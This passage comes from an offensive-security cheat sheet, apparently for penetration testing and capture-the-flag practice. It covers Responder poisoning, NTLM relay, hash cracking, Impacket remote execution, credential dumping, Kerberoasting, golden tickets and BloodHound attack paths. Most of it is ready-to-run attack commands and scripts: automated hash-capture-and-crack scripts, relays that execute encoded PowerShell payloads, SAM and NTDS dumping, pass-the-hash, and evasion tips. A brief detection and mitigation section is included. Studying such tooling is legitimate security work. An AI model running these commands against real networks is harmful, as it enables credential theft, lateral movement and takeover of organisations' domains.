LDAP = On             # LDAP server
DNS = On              # DNS server
RDP = On              # RDP server

[HTTP Server]
Basic = On            # Force basic auth instead of NTLM
WPAD = On             # WPAD proxy detection

[HTTPS Server]
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```

### Attack Scenarios

**LLMNR/NBT-NS Poisoning:**

```bash
# Standard poisoning attack
sudo responder -I eth0 -wf

# -w = WPAD rogue proxy
# -f = Force NTLM/Basic authentication on captured requests

# With fingerprinting
sudo responder -I eth0 -wfF

# -F = Force LM hashing downgrade (weaker, easier to crack)
```

**Targeted poisoning:**

```bash
# Respond only to specific hosts (requires modification)
# Edit Responder.conf:
# [Responder Core]
# RespondTo = 192.168.1.100,192.168.1.101

sudo responder -I eth0
```

**WPAD exploitation:**

```bash
# Enable WPAD poisoning
sudo responder -I eth0 -w

# Serve malicious PAC file
# Automatically created by Responder at /usr/share/responder/wpad.dat
```

### Protocol-Specific Options

**Disable specific protocols:**

```bash
# Disable SMB server
sudo responder -I eth0 --disable-smb

# Disable HTTP server
sudo responder -I eth0 --disable-http

# Run only specific services
sudo responder -I eth0 --disable-smb --disable-http --disable-ldap
```

**Force authentication types:**

```bash
# Force LM hashing (weaker)
sudo responder -I eth0 -F

# Force basic authentication on HTTP
sudo responder -I eth0 -b

# Force WPAD authentication
sudo responder -I eth0 -w -F -b
```

### Captured Credentials

**Log file locations:**

```bash
# Default log directory
/usr/share/responder/logs/

# Captured hashes
ls -la /usr/share/responder/logs/
# Files:
# - Responder-Session.log (current session)
# - HTTP-NTLMv2-192.168.1.100.txt
# - SMB-NTLMv2-SSP-192.168.1.100.txt
# - MSSQL-NTLMv2-192.168.1.100.txt

# View captured hashes
cat /usr/share/responder/logs/*.txt
```

**Hash format examples:**

```
# NTLMv2 hash format:
username::domain:challenge:response:response

# Example:
Administrator::CORP:1122334455667788:A1B2C3D4E5F6...:0101000000000000...
```

### Cracking Captured Hashes

**Using Hashcat:**

```bash
# NTLMv2 cracking
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLMv1 cracking
hashcat -m 5500 hashes.txt wordlist.txt

# Hash modes:
# 5500 - NetNTLMv1 / NetNTLMv1+ESS
# 5600 - NetNTLMv2
# 1000 - NTLM

# With rules
hashcat -m 5600 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force
hashcat -m 5600 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d
```

**Using John the Ripper:**

```bash
# Crack NTLMv2 hashes
john --format=netntlmv2 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john --show --format=netntlmv2 hashes.txt

# With rules
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt --rules=best64
```

### MultiRelay Integration

**SMB relay attacks (deprecated in favor of ntlmrelayx):**

```bash
# Note: MultiRelay.py included with Responder is deprecated
# Use Impacket's ntlmrelayx.py instead

# Edit Responder.conf - disable SMB and HTTP
# SMB = Off
# HTTP = Off

# Start Responder
sudo responder -I eth0

# In separate terminal, use ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

### Relay with ntlmrelayx (Impacket)

**NTLM relay attack workflow:**

```bash
# 1. Disable SMB and HTTP in Responder.conf
sudo sed -i 's/SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf

# 2. Start Responder for poisoning
sudo responder -I eth0 -wv

# 3. In separate terminal, start ntlmrelayx
# Relay to specific target
sudo ntlmrelayx.py -t 192.168.1.100 -smb2support

# Relay to multiple targets
echo "192.168.1.100" > targets.txt
echo "192.168.1.101" >> targets.txt
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Execute command on successful relay
sudo ntlmrelayx.py -t 192.168.1.100 -smb2support -c "whoami"

# Dump SAM database
sudo ntlmrelayx.py -t 192.168.1.100 -smb2support --sam

# Interactive shell
sudo ntlmrelayx.py -t 192.168.1.100 -smb2support -i
# Connect with: nc 127.0.0.1 11000
```

**LDAP relay for privilege escalation:**

```bash
# Relay to LDAP (Domain Controller)
sudo ntlmrelayx.py -t ldap://192.168.1.10 --escalate-user lowprivuser

# Relay to LDAPS
sudo ntlmrelayx.py -t ldaps://192.168.1.10 --escalate-user lowprivuser

# Dump AD information
sudo ntlmrelayx.py -t ldap://192.168.1.10 --dump-adcs
```

### Analysis Mode

**Passive monitoring without poisoning:**

```bash
# Analyze mode
sudo responder -I eth0 -A

# Outputs:
# - Hostnames being queried
# - Broadcast/multicast requests
# - LLMNR/NBT-NS queries
# - MDNS queries

# Useful for:
# - Understanding network behavior
# - Identifying targets
# - Avoiding detection
```

### Fingerprinting

**OS and browser fingerprinting:**

```bash
# Enable fingerprinting
sudo responder -I eth0 -f

# Captured in logs:
# - User-Agent strings
# - OS version information
# - Browser types
# - Requested resources
```

### Custom Response Files

**Custom HTML pages:**

```bash
# Location: /usr/share/responder/servers/

# Edit HTTP response
sudo nano /usr/share/responder/servers/HTTP.py

# Custom authentication page
sudo nano /usr/share/responder/files/AccessDenied.html
```

### Practical Attack Workflows

**Complete credential capture scenario:**

```bash
#!/bin/bash

INTERFACE="eth0"
OUTPUT_DIR="responder_output_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR

# Backup existing config
cp /usr/share/responder/Responder.conf $OUTPUT_DIR/Responder.conf.bak

# Start Responder with optimal settings
echo "[*] Starting Responder on $INTERFACE"
sudo responder -I $INTERFACE -wfFbv | tee $OUTPUT_DIR/responder_output.log &
RESPONDER_PID=$!

echo "[+] Responder started with PID: $RESPONDER_PID"
echo "[*] Press Ctrl+C to stop and collect hashes"

# Wait for Ctrl+C
trap ctrl_c INT
function ctrl_c() {
    echo "[*] Stopping Responder..."
    sudo kill $RESPONDER_PID
    
    # Copy captured hashes
    sudo cp /usr/share/responder/logs/*.txt $OUTPUT_DIR/ 2>/dev/null
    
    # Combine all hashes
    cat $OUTPUT_DIR/*NTLMv2*.txt > $OUTPUT_DIR/all_hashes.txt 2>/dev/null
    
    echo "[+] Hashes saved to $OUTPUT_DIR/all_hashes.txt"
    echo "[*] Crack with: hashcat -m 5600 $OUTPUT_DIR/all_hashes.txt wordlist.txt"
    
    exit 0
}

# Keep script running
while true; do sleep 1; done
```

**Responder + ntlmrelayx combined attack:**

```bash
#!/bin/bash

INTERFACE="eth0"
TARGET="192.168.1.100"

# Disable SMB/HTTP in Responder
echo "[*] Configuring Responder for relay..."
sudo sed -i 's/SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf

# Start Responder
echo "[*] Starting Responder for poisoning..."
sudo responder -I $INTERFACE -wv &
RESPONDER_PID=$!

# Wait for Responder to initialize
sleep 3

# Start ntlmrelayx in separate terminal or tmux
echo "[*] Starting ntlmrelayx for relay attacks..."
echo "[!] Run this in separate terminal:"
echo "sudo ntlmrelayx.py -t $TARGET -smb2support --sam -c 'whoami'"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up..."
    sudo kill $RESPONDER_PID 2>/dev/null
    
    # Restore Responder config
    sudo sed -i 's/SMB = Off/SMB = On/' /usr/share/responder/Responder.conf
    sudo sed -i 's/HTTP = Off/HTTP = On/' /usr/share/responder/Responder.conf
    
    exit 0
}

trap cleanup INT
echo "[*] Press Ctrl+C to stop"
while true; do sleep 1; done
```

### Detection and Evasion

**Signs of Responder activity [Inference - based on network behavior patterns]:**

```powershell
# On Windows, detect LLMNR poisoning attempts
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DNS-Client/Operational'; ID=3008} | 
    Select-Object TimeCreated, Message

# Monitor for unusual SMB authentication attempts
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625,4624} | 
    Where-Object {$_.Properties[10].Value -eq 3}

# Check for WPAD-related queries
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WinInet-Config/Operational'}
```

**Evasion techniques [Inference - based on common attack patterns]:**

```bash
# Throttle responses (reduce detection)
# Edit Responder.py to add delays between responses

# Target specific subnets only
# Modify Responder.conf with RespondTo/RespondToName directives

# Use analyze mode first
sudo responder -I eth0 -A

# Then target only active queriers
# Manual configuration required
```

### Mitigation Verification

**Check if LLMNR/NBT-NS is disabled:**

```powershell
# Check LLMNR status (should be disabled)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast

# Check NBT-NS status
Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.TcpipNetbiosOptions -eq 2}

# WPAD should be disabled
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad"
```

### Advanced Hash Capture Techniques

**Forced authentication triggers:**

```bash
# After capturing initial access, force authentication:

# SMB share access
smbclient //target/share

# WebDAV authentication
curl http://target/webdav

# MSSQL connection
mssqlclient.py user@target

# All while Responder is running
```

**Custom Responder modules:**

```bash
# Location: /usr/share/responder/servers/

# Create custom server
sudo nano /usr/share/responder/servers/Custom.py

# Register in Responder.conf
# Custom = On
```

### Log Analysis

**Parse Responder logs:**

```bash
# Extract unique usernames
grep -h ":" /usr/share/responder/logs/*.txt | cut -d':' -f1 | sort -u

# Extract domains
grep -h ":" /usr/share/responder/logs/*.txt | cut -d':' -f3 | sort -u

# Count captures by protocol
ls /usr/share/responder/logs/ | grep -oP '^\w+' | sort | uniq -c

# Most recent captures
ls -lt /usr/share/responder/logs/*.txt | head
```

**Session log analysis:**

```bash
# View current session activity
tail -f /usr/share/responder/logs/Responder-Session.log

# Search for specific user
grep -i "administrator" /usr/share/responder/logs/Responder-Session.log

# Count authentication attempts
grep -c "Sending NTLM authentication" /usr/share/responder/logs/Responder-Session.log
```

### Integration with Other Tools

**Responder + CrackMapExec:**

```bash
# Capture hashes with Responder
sudo responder -I eth0 -wfv

# Use cracked credentials with CME
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Pass-the-Hash with captured NTLM
crackmapexec smb 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**Responder + Metasploit:**

```bash
# Import captured hashes into Metasploit
msfconsole
use auxiliary/analyze/crack_windows

# Or use captured credentials
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass cracked_password
set RHOSTS 192.168.1.100
exploit
```

### CTF-Specific Scenarios

**Quick hash capture:**

```bash
# Minimal command for fast capture
sudo responder -I eth0 -w

# Wait 30 seconds
sleep 30

# Check for captures
cat /usr/share/responder/logs/*.txt
```

**Automated crack workflow:**

```bash
#!/bin/bash

# Start Responder
sudo responder -I eth0 -wfFbv &
RPID=$!

# Wait for captures (adjust time)
sleep 120

# Stop Responder
sudo kill $RPID

# Combine hashes
cat /usr/share/responder/logs/*NTLMv2*.txt > hashes.txt

# Crack with hashcat
if [ -s hashes.txt ]; then
    echo "[+] Hashes captured, starting crack..."
    hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force
    hashcat -m 5600 hashes.txt --show
else
    echo "[-] No hashes captured"
fi
```

### Troubleshooting

**Common issues:**

```bash
# Responder not capturing hashes
# - Check if LLMNR/NBT-NS traffic exists: sudo responder -I eth0 -A
# - Verify interface is correct: ip addr show
# - Ensure no firewall blocking: sudo iptables -L

# Permission denied
# - Always run with sudo
# - Check log directory permissions: ls -la /usr/share/responder/logs/

# Conflict with other services
# - Stop conflicting services: sudo systemctl stop apache2
# - Check ports: sudo netstat -tlnp | grep -E ':(80|445|389|143)'

# No authentication prompts
# - Force authentication: use -F, -b, -w flags
# - Check WPAD configuration
# - Ensure SMB signing not required on targets
```

---

**Important Related Topics**

**Critical tool categories to study next:**

- **Burp Suite** (web application security testing, intercepting proxy)
- **Metasploit Framework** (comprehensive exploitation framework)
- **Wireshark** (packet analysis and protocol dissection)
- **Nmap** (network discovery and service enumeration)
- **Hydra/Medusa** (network service brute-forcing)
- **SQLmap** (automated SQL injection exploitation)

---

## Impacket Suite

Impacket is a Python-based collection of tools for network protocol manipulation, particularly focused on SMB, MSRPC, and other Windows protocols. Essential for Active Directory exploitation.

### Core Impacket Scripts

**psexec.py - Remote Command Execution**

```bash
# Basic authentication with credentials
impacket-psexec DOMAIN/username:password@TARGET_IP

# With hash (Pass-the-Hash)
impacket-psexec -hashes :NTHASH DOMAIN/username@TARGET_IP

# With specific command
impacket-psexec DOMAIN/username:password@TARGET_IP "whoami"

# Using different authentication methods
impacket-psexec -hashes LMHASH:NTHASH DOMAIN/username@TARGET_IP
impacket-psexec -no-pass -k TARGET.DOMAIN.LOCAL  # Kerberos

# Connect to specific share
impacket-psexec DOMAIN/username:password@TARGET_IP -share ADMIN$

# Target multiple hosts from file
for ip in $(cat targets.txt); do impacket-psexec DOMAIN/user:pass@$ip; done
```

**smbexec.py - Stealthier Command Execution**

Does not drop service binary to disk, uses cmd.exe redirections.

```bash
# Basic execution
impacket-smbexec DOMAIN/username:password@TARGET_IP

# With hash
impacket-smbexec -hashes :NTHASH DOMAIN/username@TARGET_IP

# Execute single command
impacket-smbexec DOMAIN/username:password@TARGET_IP "ipconfig /all"

# Using specific share (default: C$)
impacket-smbexec -share ADMIN$ DOMAIN/username:password@TARGET_IP

# Specify service name for evasion
impacket-smbexec -service-name CustomSvc DOMAIN/username:password@TARGET_IP
```

**wmiexec.py - WMI-Based Execution**

```bash
# Standard execution
impacket-wmiexec DOMAIN/username:password@TARGET_IP

# With NTLM hash
impacket-wmiexec -hashes :NTHASH DOMAIN/username@TARGET_IP

# Using Kerberos
impacket-wmiexec -k -no-pass TARGET.DOMAIN.LOCAL

# Execute command and exit
impacket-wmiexec DOMAIN/username:password@TARGET_IP "hostname"

# Alternative namespace (default: root\cimv2)
impacket-wmiexec -namespace root/SecurityCenter2 DOMAIN/user:pass@TARGET_IP

# Output to file
impacket-wmiexec DOMAIN/user:pass@TARGET_IP "systeminfo" > sysinfo.txt
```

**atexec.py - Task Scheduler Execution**

```bash
# Create and execute scheduled task
impacket-atexec DOMAIN/username:password@TARGET_IP "whoami"

# With hash
impacket-atexec -hashes :NTHASH DOMAIN/username@TARGET_IP "systeminfo"

# Using Kerberos
impacket-atexec -k -no-pass TARGET.DOMAIN.LOCAL "ipconfig"

# Execute command at specific time (legacy, may not work on modern systems)
# Modern Windows uses schtasks instead of AT command
```

**dcomexec.py - DCOM-Based Execution**

```bash
# Default DCOM object (MMC20.Application)
impacket-dcomexec DOMAIN/username:password@TARGET_IP

# Specify DCOM object
impacket-dcomexec -object MMC20 DOMAIN/username:password@TARGET_IP
impacket-dcomexec -object ShellWindows DOMAIN/username:password@TARGET_IP
impacket-dcomexec -object ShellBrowserWindow DOMAIN/username:password@TARGET_IP

# With hash
impacket-dcomexec -hashes :NTHASH DOMAIN/username@TARGET_IP "whoami"

# Execute single command
impacket-dcomexec DOMAIN/username:password@TARGET_IP "cmd.exe /c whoami"
```

**secretsdump.py - Credential Extraction**

```bash
# Dump SAM, SECURITY, SYSTEM hives
impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL

# Remote credential dumping
impacket-secretsdump DOMAIN/username:password@TARGET_IP

# With hash authentication
impacket-secretsdump -hashes :NTHASH DOMAIN/username@TARGET_IP

# Dump NTDS.dit (Domain Controller)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM.save LOCAL
impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc

# Dump specific user
impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc-user Administrator

# Dump NTLM hashes only
impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc-ntlm

# Output to file
impacket-secretsdump DOMAIN/username:password@DC_IP -outputfile domain_creds

# Dump with Kerberos
impacket-secretsdump -k -no-pass TARGET.DOMAIN.LOCAL -just-dc

# Use VSS (Volume Shadow Copy) method
impacket-secretsdump -use-vss DOMAIN/username:password@TARGET_IP
```

**GetNPUsers.py - AS-REP Roasting**

Identifies accounts without Kerberos pre-authentication and retrieves crackable hashes.

```bash
# Check single user
impacket-GetNPUsers DOMAIN/username -no-pass -dc-ip DC_IP

# Check users from file
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# With credentials to enumerate all vulnerable users
impacket-GetNPUsers DOMAIN/username:password -dc-ip DC_IP -request

# Output formats
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format john -dc-ip DC_IP
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -dc-ip DC_IP

# Output to file
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -outputfile asrep_hashes.txt
```

**GetUserSPNs.py - Kerberoasting**

```bash
# Request TGS for all SPN accounts
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request

# Output to hashcat format
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request -outputfile spn_hashes.txt

# Specific SPN
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request-user TARGET_USER

# Save TGS tickets
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request -save

# With hash authentication
impacket-GetUserSPNs -hashes :NTHASH DOMAIN/username -dc-ip DC_IP -request
```

**GetADUsers.py - Active Directory Enumeration**

```bash
# Enumerate all AD users
impacket-GetADUsers -all DOMAIN/username:password -dc-ip DC_IP

# Specific user details
impacket-GetADUsers DOMAIN/username:password -dc-ip DC_IP

# Output to file
impacket-GetADUsers -all DOMAIN/username:password -dc-ip DC_IP > ad_users.txt

# With debug info
impacket-GetADUsers -debug -all DOMAIN/username:password -dc-ip DC_IP
```

**lookupsid.py - SID Enumeration**

```bash
# Enumerate domain SIDs
impacket-lookupsid DOMAIN/username:password@TARGET_IP

# With known domain SID
impacket-lookupsid DOMAIN/username:password@TARGET_IP 20000

# Brute force RIDs
impacket-lookupsid DOMAIN/username:password@TARGET_IP | grep SidTypeUser

# Anonymous connection (if allowed)
impacket-lookupsid anonymous@TARGET_IP -no-pass
```

**rpcdump.py - RPC Endpoint Enumeration**

```bash
# Enumerate RPC endpoints
impacket-rpcdump DOMAIN/username:password@TARGET_IP

# Anonymous enumeration
impacket-rpcdump TARGET_IP

# Specific port
impacket-rpcdump -port 135 TARGET_IP

# Output verbose
impacket-rpcdump -debug DOMAIN/username:password@TARGET_IP
```

**samrdump.py - SAM Remote Protocol Enumeration**

```bash
# Dump SAM database remotely
impacket-samrdump DOMAIN/username:password@TARGET_IP

# With hash
impacket-samrdump -hashes :NTHASH DOMAIN/username@TARGET_IP

# Anonymous (if configured)
impacket-samrdump TARGET_IP
```

**services.py - Remote Service Management**

```bash
# List services
impacket-services DOMAIN/username:password@TARGET_IP list

# Start service
impacket-services DOMAIN/username:password@TARGET_IP start SERVICE_NAME

# Stop service
impacket-services DOMAIN/username:password@TARGET_IP stop SERVICE_NAME

# Query service status
impacket-services DOMAIN/username:password@TARGET_IP status SERVICE_NAME

# Create service
impacket-services DOMAIN/username:password@TARGET_IP create -name CustomSvc -display "Custom Service" -path "C:\Path\To\Binary.exe"

# Delete service
impacket-services DOMAIN/username:password@TARGET_IP delete SERVICE_NAME
```

**reg.py - Remote Registry Operations**

```bash
# Query registry key
impacket-reg DOMAIN/username:password@TARGET_IP query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion

# Add registry value
impacket-reg DOMAIN/username:password@TARGET_IP add -keyName "HKLM\\SOFTWARE\\Test" -v TestValue -vd "TestData" -vt REG_SZ

# Delete registry key
impacket-reg DOMAIN/username:password@TARGET_IP delete -keyName "HKLM\\SOFTWARE\\Test"

# Save registry hive
impacket-reg DOMAIN/username:password@TARGET_IP save -keyName HKLM\\SAM -o C:\\temp\\sam.save

# Backup entire hive
impacket-reg DOMAIN/username:password@TARGET_IP backup -keyName HKLM\\SYSTEM -o system.hive
```

**ntlmrelayx.py - NTLM Relay Attacks**

```bash
# Basic SMB relay to target
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to specific target with command execution
impacket-ntlmrelayx -t TARGET_IP -smb2support -c "whoami"

# SOCKS proxy mode
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Relay to LDAP (escalate privileges)
impacket-ntlmrelayx -t ldap://DC_IP -smb2support --escalate-user USERNAME

# Dump SAM on relay
impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe

# Interactive mode
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Relay with specific interface
impacket-ntlmrelayx -tf targets.txt -smb2support -ip ATTACKER_IP

# Output results
impacket-ntlmrelayx -tf targets.txt -smb2support -outputfile relay_results.txt
```

**getST.py - Request Service Tickets**

```bash
# Request TGT with hash
impacket-getST -hashes :NTHASH DOMAIN/username

# Impersonate user
impacket-getST -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator DOMAIN/username:password

# With AES key
impacket-getST -aesKey AES_KEY DOMAIN/username

# Request specific SPN
impacket-getST -spn MSSQLSvc/SQL01.DOMAIN.LOCAL:1433 DOMAIN/username:password
```

**getTGT.py - Request TGT**

```bash
# Request TGT with credentials
impacket-getTGT DOMAIN/username:password

# With hash
impacket-getTGT -hashes :NTHASH DOMAIN/username

# With AES key
impacket-getTGT -aesKey AES_KEY DOMAIN/username

# Save ticket to specific file
impacket-getTGT -dc-ip DC_IP DOMAIN/username:password

# Export to use with other tools
export KRB5CCNAME=/path/to/ticket.ccache
```

**ticketer.py - Golden/Silver Ticket Creation**

```bash
# Golden ticket (requires krbtgt hash)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL username

# Silver ticket (requires service hash)
impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL -spn cifs/TARGET.DOMAIN.LOCAL username

# With specific groups
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL -groups 512,513,518,519,520 Administrator

# Custom ticket duration
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL -duration 365 username

# Export and use
export KRB5CCNAME=username.ccache
impacket-psexec -k -no-pass TARGET.DOMAIN.LOCAL
```

**raiseChild.py - Domain Privilege Escalation**

```bash
# Escalate from child domain to forest root
impacket-raiseChild -target-exec DC.ROOT.DOMAIN.LOCAL CHILD.DOMAIN.LOCAL/Administrator:password
```

### Advanced Impacket Usage Patterns

**Pass-the-Hash Workflow:**

```bash
# 1. Dump credentials
impacket-secretsdump DOMAIN/user:pass@TARGET_IP -outputfile creds

# 2. Extract NTLM hash from output
# Format: USERNAME:RID:LMHASH:NTHASH:::

# 3. Use hash for lateral movement
impacket-wmiexec -hashes :NTHASH DOMAIN/Administrator@TARGET2_IP
```

**Kerberos Ticket Workflow:**

```bash
# 1. Request TGT
impacket-getTGT DOMAIN/username:password -dc-ip DC_IP

# 2. Set ticket environment variable
export KRB5CCNAME=username.ccache

# 3. Use ticket with other tools
impacket-psexec -k -no-pass TARGET.DOMAIN.LOCAL
impacket-smbclient -k -no-pass TARGET.DOMAIN.LOCAL
```

**NTLM Relay with Responder:**

```bash
# Terminal 1: Start Responder
responder -I eth0 -rdwv

# Terminal 2: Setup relay with ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc BASE64_PAYLOAD"

# Wait for authentication attempt
```

## BloodHound/SharpHound

BloodHound visualizes Active Directory trust relationships and attack paths to identify privilege escalation vectors.

### SharpHound Data Collection (Windows)

**PowerShell SharpHound:**

```powershell
# Import module
Import-Module .\SharpHound.ps1

# Run all collection methods
Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -LDAPUser username -LDAPPass password

# Collect specific methods
Invoke-BloodHound -CollectionMethod DCOnly -Domain DOMAIN.LOCAL
Invoke-BloodHound -CollectionMethod Session,LoggedOn -Domain DOMAIN.LOCAL

# Stealth collection (no session enumeration)
Invoke-BloodHound -CollectionMethod Group,LocalAdmin,GPOLocalGroup,Trusts -Domain DOMAIN.LOCAL

# Output to specific directory
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName domain_data.zip

# Exclude domain controllers from session enumeration
Invoke-BloodHound -CollectionMethod All -ExcludeDCs

# Specify domain controller
Invoke-BloodHound -CollectionMethod All -DomainController DC01.DOMAIN.LOCAL

# Loop collection (persistence)
Invoke-BloodHound -CollectionMethod Session -Loop -LoopDuration 01:00:00 -LoopInterval 00:05:00
```

**SharpHound.exe Executable:**

```bash
# All collection methods
SharpHound.exe -c All

# Specific collections
SharpHound.exe -c DCOnly
SharpHound.exe -c Session,Group,LocalAdmin,GPOLocalGroup,Trusts

# With domain specification
SharpHound.exe -c All -d DOMAIN.LOCAL

# Custom domain controller
SharpHound.exe -c All --domaincontroller DC01.DOMAIN.LOCAL

# Output options
SharpHound.exe -c All --outputdirectory C:\Temp
SharpHound.exe -c All --outputprefix custom_name
SharpHound.exe -c All --zipfilename results.zip

# Exclude domain controllers
SharpHound.exe -c All --excludedcs

# Stealth mode (longer but less noisy)
SharpHound.exe -c All --stealth

# Throttle requests
SharpHound.exe -c All --throttle 1000

# LDAP timeout
SharpHound.exe -c All --ldaptimeout 60

# Verbose output
SharpHound.exe -c All -v
```

**Collection Methods Explained:**

- `All`: All collection methods
- `Group`: Group membership information
- `LocalAdmin`: Local administrator rights
- `Session`: Active sessions on computers
- `LoggedOn`: Currently logged on users via registry
- `Trusts`: Domain trust relationships
- `ACL`: Access Control Lists
- `Container`: OU and container structures
- `GPOLocalGroup`: Group Policy Object applied local groups
- `SPNTargets`: Service Principal Names
- `DCOnly`: Only data from DC (no computer enumeration)

### BloodHound-Python (Linux)

```bash
# Install
pip install bloodhound

# Basic collection
bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c All

# Specific collection methods
bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c DCOnly
bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c Group,LocalAdmin

# With NTLM hash
bloodhound-python -u username --hashes :NTHASH -ns DC_IP -d DOMAIN.LOCAL -c All

# Kerberos authentication
bloodhound-python -u username -k -ns DC_IP -d DOMAIN.LOCAL -c All

# Specify domain controller
bloodhound-python -u username -p password -dc DC01.DOMAIN.LOCAL -ns DC_IP -d DOMAIN.LOCAL -c All

# Output to specific directory
bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c All --zip

# Disable certificate verification
bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c All --disable-autogc

# Verbose
bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c All -v
```

### BloodHound Setup and Usage

**Installation (Kali):**

```bash
# Update package list
sudo apt update

# Install BloodHound and Neo4j
sudo apt install bloodhound neo4j

# Start Neo4j
sudo neo4j console

# Access Neo4j browser at http://localhost:7474
# Default credentials: neo4j:neo4j (must change on first login)

# Start BloodHound
bloodhound

# Or with custom Neo4j endpoint
bloodhound --no-sandbox
```

**BloodHound Interface Operations:**

1. **Upload Data:**
    
    - Click "Upload Data" button
    - Select SharpHound JSON/ZIP files
    - Wait for import completion
2. **Pre-Built Queries:**
    
    - Find all Domain Admins
    - Find Shortest Paths to Domain Admins
    - Find Principals with DCSync Rights
    - Shortest Path from Owned Principals
    - Shortest Path to High Value Targets
3. **Custom Cypher Queries:**
    

```cypher
// Find all Domain Admins
MATCH (n:User)-[r:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN n

// Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Find users with SPN set (Kerberoastable)
MATCH (u:User {hasspn:true}) RETURN u

// Find shortest path from specific user to Domain Admins
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

// Find users with DCSync rights
MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p

// Find computers where Domain Users can RDP
MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:CanRDP]->(c:Computer) RETURN p

// Find all users with local admin rights
MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN p

// Find Kerberoastable users with path to DA
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

// Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u

// Find computers with LAPS enabled
MATCH (c:Computer) WHERE c.haslaps=true RETURN c

// Find users with passwords in description
MATCH (u:User) WHERE u.description CONTAINS 'pass' RETURN u

// Find all computers in domain
MATCH (c:Computer) RETURN c.name, c.operatingsystem

// Find outbound trusts
MATCH (d:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d,r,d2
```

4. **Marking Owned/High Value:**
    
    - Right-click node â†’ "Mark User as Owned"
    - Right-click node â†’ "Mark User as High Value"
    - Use to track compromise progression
5. **Path Analysis:**
    
    - Click edge (relationship) to see abuse information
    - Follow "Abuse Info" tab for exploitation steps
    - Note opsec considerations

### Common BloodHound Attack Paths

**GenericAll on User:**

```bash
# Change user password
net user TARGET_USER NewPassword123! /domain

# Or via PowerView
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)
```

**ForceChangePassword:**

```powershell
# PowerView
$NewPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $NewPassword
```

**AddMembers (Group):**

```bash
# Add user to group
